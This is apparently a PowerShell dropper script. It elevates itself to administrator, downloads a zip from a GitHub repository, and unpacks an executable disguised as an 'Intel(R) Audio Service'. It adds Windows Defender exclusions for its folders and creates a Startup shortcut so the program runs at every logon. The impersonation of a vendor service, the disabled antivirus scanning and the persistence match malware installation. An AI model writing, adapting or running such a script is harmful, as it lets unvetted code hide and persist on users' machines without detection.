# Clear-Host
# Self-elevate the script if required
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
      if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
            $CommandLine = "-NoExit -c cd '$pwd'; & `"" + $MyInvocation.MyCommand.Path + "`""
            Start-Process powershell -Verb runas -ArgumentList $CommandLine
            Exit
      }
}
  
#Elevated script content after that
$WScriptShell = New-Object -ComObject WScript.Shell
$FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$ShortcutFile = "$FolderPath\Intel(R) Audio Service.lnk"
$TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel(R) Audio Service"
$TargetFile = "$TargetPath\Intel(R) Audio Service.exe"
$TargetZip = "$TargetPath\Intel(R) Audio Service.exe.zip"

New-Item -ItemType Directory -Force -Path $FolderPath
Write-Output "Shortcut folder created"
New-Item -ItemType Directory -Force -Path $TargetPath
Write-Output "Target folder created"
Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/blob/main/dist/Intel(R) Audio Service.exe.zip" -OutFile $TargetZip
Write-Output "File downloaded"
Expand-Archive -Path $TargetZip -DestinationPath $TargetPath -Force
Add-MpPreference -ExclusionPath $FolderPath
Add-MpPreference -ExclusionPath $TargetPath
Write-Output "Exclusions added"
$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$Shortcut.TargetPath = $TargetFile
$Shortcut.WorkingDirectory = $TargetPath
$Shortcut.IconLocation = "$TargetPath\Intel(R) Audio Service.exe,0"
$Shortcut.Save()
Write-Output "Shortcut created"
      

# Restart-Computer -Force
